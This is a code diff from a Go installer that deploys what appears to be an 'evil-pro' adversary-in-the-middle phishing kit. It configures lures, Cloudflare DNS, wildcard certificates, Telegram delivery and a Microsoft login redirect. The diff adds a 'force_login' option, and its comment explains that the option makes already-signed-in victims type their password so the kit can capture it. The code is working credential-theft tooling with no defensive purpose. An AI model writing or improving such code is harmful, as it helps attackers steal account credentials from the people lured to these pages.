@@ -71,11 +71,11 @@ func (j *Job) snack() (string, string, []string, map[string]string) {
 // ---------------------------------------------------------------------------
 
 type InstallOpts struct {
-	Fresh      bool `json:"fresh"`       // overwrite config.json / lures
-	WithCF     bool `json:"with_cf"`     // create DNS records via Cloudflare
-	WithCert   bool `json:"with_cert"`   // issue a wildcard cert via DNS-01
-	Telegram   bool `json:"telegram"`    // write telegram creds into config
-	Harden     bool `json:"harden"`      // firewall + disable systemd-resolved
+	Fresh    bool `json:"fresh"`     // overwrite config.json / lures
+	WithCF   bool `json:"with_cf"`   // create DNS records via Cloudflare
+	WithCert bool `json:"with_cert"` // issue a wildcard cert via DNS-01
+	Telegram bool `json:"telegram"`  // write telegram creds into config
+	Harden   bool `json:"harden"`    // firewall + disable systemd-resolved
 }
 
 // ---------------------------------------------------------------------------
@@ -94,6 +94,35 @@ func tailLines(s string, n int) []string {
 func fileExists(p string) bool {
 	st, err := os.Stat(p)
 	return err == nil && !st.IsDir()
+}
+
+// looksLikeRepo reports whether dir is an evil-pro repo or portable root.
+func looksLikeRepo(dir string) bool {
+	if strings.TrimSpace(dir) == "" {
+		return false
+	}
+	if fileExists(filepath.Join(dir, "extension", "manifest.json")) {
+		return true
+	}
+	return fileExists(filepath.Join(dir, "go.mod"))
+}
+
+// resolveRepo returns want when it is a real repo/portable root, else searches
+// the binary's own folder, its parent, and the working directory (and parent).
+// This is what makes a mistyped -repo, a path split on spaces, or a moved folder
+// self-correct instead of silently pointing one directory too high.
+func resolveRepo(want string) string {
+	if looksLikeRepo(want) {
+		return want
+	}
+	root := appRoot()
+	wd, _ := os.Getwd()
+	for _, c := range []string{root, filepath.Dir(root), wd, filepath.Dir(wd)} {
+		if looksLikeRepo(c) {
+			return c
+		}
+	}
+	return want
 }
 
 // buildEnv gives the local `go build` a cache/temp inside the app folder, so it
@@ -624,25 +653,25 @@ func (a *App) verify(j *Job, c *SSH, p *Profile, dir string) error {
 
 func (a *App) buildConfig(p *Profile, opts InstallOpts, ip string) []byte {
 	general := map[string]interface{}{
-		"autocert":         true,
-		"bind_ipv4":        "",
-		"chatid":           "",
-		"dashboard_pass":   p.DashboardPass,
-		"dashboard_sub":    p.DashboardSub,
-		"dashboard_user":   p.DashboardUser,
-		"dns_port":         53,
-		"domain":           p.Domain,
-		"external_ipv4":    ip,
-		"http_port":        0,
-		"https_port":       443,
-		"ipv4":             "",
-		"strip_headers":    true,
-		"telegram_enabled": false,
-		"teletoken":        "",
+		"autocert":             true,
+		"bind_ipv4":            "",
+		"chatid":               "",
+		"dashboard_pass":       p.DashboardPass,
+		"dashboard_sub":        p.DashboardSub,
+		"dashboard_user":       p.DashboardUser,
+		"dns_port":             53,
+		"domain":               p.Domain,
+		"external_ipv4":        ip,
+		"http_port":            0,
+		"https_port":           443,
+		"ipv4":                 "",
+		"strip_headers":        true,
+		"telegram_enabled":     false,
+		"teletoken":            "",
 		"turnstile_secret_key": "",
 		"turnstile_site_key":   "",
-		"unauth_url":       "https://login.microsoftonline.com/",
-		"unauth_redirect":  true,
+		"unauth_url":           "https://login.microsoftonline.com/",
+		"unauth_redirect":      true,
 	}
 	if opts.Telegram {
 		general["teletoken"] = p.TelegramToken
@@ -829,6 +858,13 @@ func (a *App) ensureConfig(j *Job, c *SSH, p *Profile) {
 	}
 	if _, ok := g["strip_headers"]; !ok {
 		g["strip_headers"] = true
+		changed = true
+	}
+	// Always ask for credentials, even when the visitor already has a session
+	// for the provider. Without this an already-signed-in victim never types a
+	// password, so nothing gets captured.
+	if _, ok := g["force_login"]; !ok {
+		g["force_login"] = true
 		changed = true
 	}
 	if u, _ := g["unauth_url"].(string); u == "" {
